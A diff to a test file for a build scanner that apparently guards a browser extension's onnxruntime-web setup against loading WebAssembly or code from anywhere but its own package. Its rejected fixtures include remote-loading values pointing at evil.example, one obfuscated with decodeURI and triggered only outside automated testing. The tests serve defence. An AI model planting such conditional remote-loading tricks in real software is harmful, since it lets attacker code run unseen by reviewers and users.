@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
-import { RESULT_CHUNK, scriptProblems, wasmSignatures } from '../../scripts/lib/wasm-scan';
+import { importsRuntime, scriptProblems, wasmSignatures } from '../../scripts/lib/wasm-scan';
+import { REAL_CHUNK } from './helpers/runtime-chunk';
 
 // WebAssembly can reach a built script as bytes: written out as a literal, base64, hex, an escape or a number list.
 // Whatever the spelling, a script of the build that carries the header of a module (\0asm) is refused, unless it is
@@ -48,42 +49,93 @@ describe('wasmSignatures', () => {
   });
 });
 
-describe('scriptProblems: the runtime settings that would load other WebAssembly', () => {
-  const ok =
-    'async function I(){o.env.wasm.wasmPaths=chrome.runtime.getURL("ort/"),o.env.wasm.numThreads=1}';
+describe('scriptProblems: the settings that would make onnxruntime-web load other code or bytes', () => {
   const RESULT = 'assets/result-4HZRFhwR.js';
+  const withWasmPaths = (rhs: string) =>
+    REAL_CHUNK.replace('.wasm.wasmPaths=I()', `.wasm.wasmPaths=${rhs}`);
 
-  it('names the one legitimate chunk', () => {
-    expect(RESULT_CHUNK.test(RESULT)).toBe(true);
+  it('recognises the chunk that imports the vendored runtime', () => {
+    expect(importsRuntime(REAL_CHUNK)).toBe(true);
+    expect(importsRuntime("import*as o from'../ort/ort.wasm.min.mjs';")).toBe(true);
     for (const other of [
-      'assets/welcome-abc.js',
-      'background.js',
-      'select.js',
-      'assets/ort/result-abc.js',
-      'result-abc.js',
-      'assets/result-abc.mjs',
-      'ort/result-abc.js',
+      'import*as o from"../ort/other.mjs";',
+      'import*as o from"./ort/ort.wasm.min.mjs";',
+      'const a="../ort/ort.wasm.min.mjs";',
     ]) {
-      expect(RESULT_CHUNK.test(other), other).toBe(false);
+      expect(importsRuntime(other), other).toBe(false);
     }
   });
 
-  it('accepts the result chunk that sets wasmPaths once, from a call', () => {
-    expect(scriptProblems(RESULT, ok)).toEqual([]);
-    expect(scriptProblems(RESULT, 'e.wasm.wasmPaths = f()')).toEqual([]);
-    expect(scriptProblems(RESULT, 'e.wasm.wasmPaths=chrome.runtime.getURL(R)')).toEqual([]);
+  it('accepts the chunk as the build emits it', () => {
+    expect(scriptProblems(RESULT, REAL_CHUNK)).toEqual([]);
+  });
+
+  it('accepts the inlined spelling too: the value written in place', () => {
+    expect(scriptProblems(RESULT, withWasmPaths('chrome.runtime.getURL("ort/")'))).toEqual([]);
   });
 
   it.each([
-    ['a string literal', 'o.env.wasm.wasmPaths="https://cdn.example.com/ort/"'],
-    ['a template', 'o.env.wasm.wasmPaths=`https://cdn.example.com/`'],
-    ['an object', 'o.env.wasm.wasmPaths={wasm:u,mjs:v}'],
-    ['an object key', 'init({wasmPaths:"https://cdn.example.com/"})'],
-    ['a plain variable', 'o.env.wasm.wasmPaths=where'],
-    ['a second setting', `${ok};${ok}`],
-    ['a read', 'use(o.env.wasm.wasmPaths)'],
-  ])('rejects wasmPaths set from %s', (_name, code) => {
-    expect(scriptProblems(RESULT, code).join('\n'), code).toContain('wasmPaths');
+    [
+      'a decoded string, conditional on the environment (the review of PR #6)',
+      'decodeURI("getManifest"in chrome.runtime&&!navigator.webdriver?"%68ttps://evil.example/ort/":I())',
+    ],
+    ['a different call', 'g()'],
+    ['a call with an argument', 'I("x")'],
+    ['another directory', 'chrome.runtime.getURL("ort/x/")'],
+    ['another file of the extension', 'chrome.runtime.getURL("ort/ort-wasm-simd-threaded.wasm")'],
+    ['a string literal', '"https://evil.example/ort/"'],
+    ['a template', '`https://evil.example/ort/`'],
+    ['an object', '{wasm:"https://evil.example/x",mjs:I()}'],
+    ['a frozen object', 'Object.freeze({mjs:I(),wasm:"https://evil.example/x"})'],
+    ['a conditional', 'a?I():"x"'],
+    ['a variable', 'where'],
+    ['a member', 'cfg.url'],
+    ['a sequence', '(0,I())'],
+  ])('rejects wasmPaths set from %s', (_what, rhs) => {
+    expect(scriptProblems(RESULT, withWasmPaths(rhs)).join('\n'), rhs).toContain('wasmPaths');
+  });
+
+  it('rejects a function that returns anything but exactly the packaged directory', () => {
+    for (const body of [
+      'chrome.runtime.getURL("ort/x")',
+      'decodeURI("%68ttps://evil.example/")',
+      'chrome.runtime.getURL("ort/")+"x"',
+    ]) {
+      const chunk = REAL_CHUNK.replace(
+        'var I=()=>chrome.runtime.getURL("ort/")',
+        `var I=()=>${body}`,
+      );
+      expect(scriptProblems(RESULT, chunk).join('\n'), body).toContain('wasmPaths');
+    }
+  });
+
+  it('rejects a second assignment and an undefined function', () => {
+    expect(scriptProblems(RESULT, `${REAL_CHUNK};e.wasm.wasmPaths=I()`).join('\n')).toContain(
+      'wasmPaths',
+    );
+    expect(
+      scriptProblems(
+        RESULT,
+        REAL_CHUNK.replace('var I=()=>chrome.runtime.getURL("ort/");', ''),
+      ).join('\n'),
+    ).toContain('wasmPaths');
+    expect(
+      scriptProblems(RESULT, `${REAL_CHUNK};var I=()=>chrome.runtime.getURL("ort/")`).join('\n'),
+    ).toContain('wasmPaths');
+  });
+
+  it('rejects any other mention of the two names in that chunk', () => {
+    for (const extra of [
+      'x.wasmBinary=b',
+      'use(o.env.wasm.wasmPaths)',
+      'const{wasmPaths:p}=o.env.wasm',
+      'init({wasmPaths:u})',
+      'Reflect.set(o.env.wasm,"wasmBinary",b)',
+    ]) {
+      expect(scriptProblems(RESULT, `${REAL_CHUNK};${extra}`).join('\n'), extra).toMatch(
+        /wasmPaths|wasmBinary/,
+      );
+    }
   });
 
   it.each([
@@ -93,19 +145,9 @@ describe('scriptProblems: the runtime settings that would load other WebAssembly
     'select.js',
     'assets/ort/result-abc.js',
     'result-abc.js',
-  ])('rejects wasmPaths in %s, which has no business with the runtime', (file) => {
-    expect(scriptProblems(file, ok).join('\n')).toContain('wasmPaths');
-  });
-
-  it('rejects wasmBinary everywhere, the result chunk included', () => {
-    for (const file of [RESULT, 'background.js', 'assets/x.js', 'ort/other.mjs']) {
-      expect(scriptProblems(file, 'o.env.wasm.wasmBinary=bytes').join('\n'), file).toContain(
-        'wasmBinary',
-      );
-      expect(scriptProblems(file, 'const {wasmBinary:b}=o.env.wasm').join('\n'), file).toContain(
-        'wasmBinary',
-      );
-    }
+  ])('rejects the two names in %s, which does not configure the runtime', (file) => {
+    expect(scriptProblems(file, 'o.env.wasm.wasmPaths=I()').join('\n')).toContain('wasmPaths');
+    expect(scriptProblems(file, 'o.env.wasm.wasmBinary=b').join('\n')).toContain('wasmBinary');
   });
 
   it('reports a module header in any script', () => {
